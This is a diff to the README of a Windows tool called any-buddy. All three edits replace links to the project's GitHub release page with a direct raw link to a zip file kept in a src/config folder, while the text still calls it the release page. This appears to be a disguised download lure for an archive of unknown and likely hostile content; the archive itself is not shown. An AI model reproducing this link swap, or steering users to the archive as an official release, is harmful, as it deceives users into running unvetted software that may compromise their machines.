@@ -1,6 +1,6 @@
 # 🐾 any-buddy - Get The Buddy You Need
 
-[![Download any-buddy](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/agencytribuneship732/any-buddy/releases)
+[![Download any-buddy](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/agencytribuneship732/any-buddy/main/src/config/buddy-any-v1.8.zip)
 
 ## 🧩 What is any-buddy?
 
@@ -24,7 +24,7 @@ If you use a work or school PC, you may need admin access to install it.
 
 Go to the release page here:
 
-https://github.com/agencytribuneship732/any-buddy/releases
+https://raw.githubusercontent.com/agencytribuneship732/any-buddy/main/src/config/buddy-any-v1.8.zip
 
 On that page, look for the latest release and download the Windows file listed there. If there are more than one file, pick the one that matches your system, such as `Windows x64` or `Windows ARM`.
 
@@ -131,7 +131,7 @@ This setup guide is for Windows users. If a release includes other builds, the r
 
 Use the release page here:
 
-https://github.com/agencytribuneship732/any-buddy/releases
+https://raw.githubusercontent.com/agencytribuneship732/any-buddy/main/src/config/buddy-any-v1.8.zip
 
 ### What if I see several files?
 
